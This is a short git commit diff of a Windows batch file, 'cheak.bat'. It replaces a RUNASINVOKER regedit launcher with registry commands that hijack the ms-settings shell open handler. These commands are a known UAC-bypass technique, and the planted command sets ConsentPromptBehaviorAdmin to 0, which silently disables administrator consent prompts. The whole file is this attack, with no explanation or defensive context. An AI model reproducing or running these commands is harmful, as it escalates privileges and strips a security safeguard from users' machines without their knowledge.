c374a4e37c9afe74c76f576315b8ac2c0c967334
OwerZeroTwo <161704626+OwerZeroTwo@users.noreply.github.com>
2024-10-11 07:35:20 +0300

    cheak.bat

--- cheak.bat
+++ cheak.bat
@@ -1,2 +1,2 @@
-Set ApplicationPath="C:\windows\regedit.exe"
-cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" %ApplicationPath%"
+REG ADD "HKCU\SOFTWARE\Classes\ms-settings\shell\open\command" /t REG_SZ /d "C:\windows\system32\cmd.exe /c REG ADD HKLM\software\microsoft\windows\currentversion\policies\system /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f" /f
+REG ADD "hkcu\software\classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d " " /f
